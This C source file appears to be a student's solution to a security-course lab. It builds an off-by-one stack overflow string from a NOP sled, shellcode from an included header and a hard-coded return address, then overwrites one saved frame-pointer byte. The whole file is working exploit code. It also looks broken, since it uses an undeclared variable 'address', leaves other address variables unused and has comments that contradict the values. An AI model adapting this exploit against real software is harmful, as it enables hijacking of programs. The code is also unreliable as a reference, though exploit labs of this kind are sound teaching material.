#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

/*
 * Construct your exploit string in the main function and print it.
 * You can pass it into a target binary <target> by running"<target> $(sploit)"
 * in your terminal.
 */

int main(void)
{
  // put shellcode 0xffffd4d4
  // put shellcode address buf[236:240]
  // 0xffffd4d4 + 0xf0 - 0x04 = 0xffffd4d0 + 0xf0 = 0xffffd5c0
  // overwrite the exploit[240] with c0
  int buffer_len = 240;
  char exploit[buffer_len + 1]; // 1 bit overflow
  int buf_address = 0xffffd510;
  int buf_address_address = 0xffffd5bc;
  char ebp_bit = 32; // 20
  memcpy(exploit + (buffer_len - sizeof(address)), &address, sizeof(address));

  int m = buffer_len  - (strlen(shellcode) + sizeof(address));
  // nop sled
  for (int i = 0; i < m; i++) {
      exploit[i] = 0x90;
  }
  for (int i = m; i < m + strlen(shellcode); i++) {
      exploit[i] = shellcode[i - m];
  }

  exploit[buffer_len] = ebp_bit;
  printf("%s", exploit);
  return 0;
}
